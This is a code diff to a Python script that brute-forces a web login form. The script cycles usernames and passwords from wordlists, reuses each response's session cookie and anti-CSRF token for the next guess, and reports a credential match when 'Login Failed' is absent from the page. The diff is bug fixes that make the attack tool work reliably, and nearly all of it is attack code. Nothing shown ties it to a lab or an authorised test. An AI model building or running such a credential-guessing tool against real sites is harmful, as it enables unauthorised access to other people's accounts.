@@ -74,6 +74,8 @@ def forge_post(url, token, in_cookie, username, password):
         "token" : token
     }
 
+    print(payload.values())
+    print("\n")
 
     resp = session.post(url, headers = headers, data=payload, cookies=cookies)
 
@@ -81,7 +83,9 @@ def forge_post(url, token, in_cookie, username, password):
 
 def analyze_resp(resp):
 
-    password_correct = False
+    pass_match = False
+    next_cookie = ""
+    token = ""
     
     #extract response cookie from set_session in html body
 
@@ -89,9 +93,7 @@ def analyze_resp(resp):
     
     if session_match:
         next_cookie = session_match.groups(0)[0]
-        print("set_session cookie:", next_cookie)
-    else:
-        return 0
+
 
     #extract response cookie from token in html body
 
@@ -99,18 +101,22 @@ def analyze_resp(resp):
     
     if token_match:
         token = token_match.groups(0)[0]
-        print("Token value:", token)
-    else:
-        return 0
+
 
     # search for positive password feedback in html body
 
     fail_match = re.search(r'Login Failed', resp.text)
 
-    if fail_match.group(0) == 'Login Failed':
-        password_correct = True
+    #print(fail_match)
 
-    return (next_cookie, token, password_correct)
+    
+    if fail_match is not None:
+        if fail_match.group(0) == 'Login Failed':
+            pass_match = False
+    else:
+        pass_match = True
+
+    return (next_cookie, token, pass_match)
 
 
 ###########################################   MAIN   #############################################
@@ -122,21 +128,22 @@ def main():
 
     #initial GET request
     resp = initial_session.get(URL)
-    (cookie, token, password_correct) = analyze_resp(resp)
+    (cookie, token, pass_match) = analyze_resp(resp)
 
     with open(USER_FILE,"r") as u:
         with open(PASS_FILE,"r") as f:
 
             for user in u.readlines():
-                # password match flag
-                password_correct = False
 
                 for password in f.readlines():
-                    resp = forge_post(URL, token, cookie, user, password)
-                    (cookie, token, password_correct) = analyze_resp(resp)
+                    resp = forge_post(URL, token.strip(), cookie.strip(),\
+                         user.strip(), password.strip())
+                    (cookie, token, pass_match) = analyze_resp(resp)
                     
-                    if password_correct:
-                        print(f"[+] Credential match > {user}:{password}")
+                    if pass_match:
+                        print("[+] Credential match!")
+                        print(f"{user.strip()}:{password.strip()}")
+
                         break
 
 
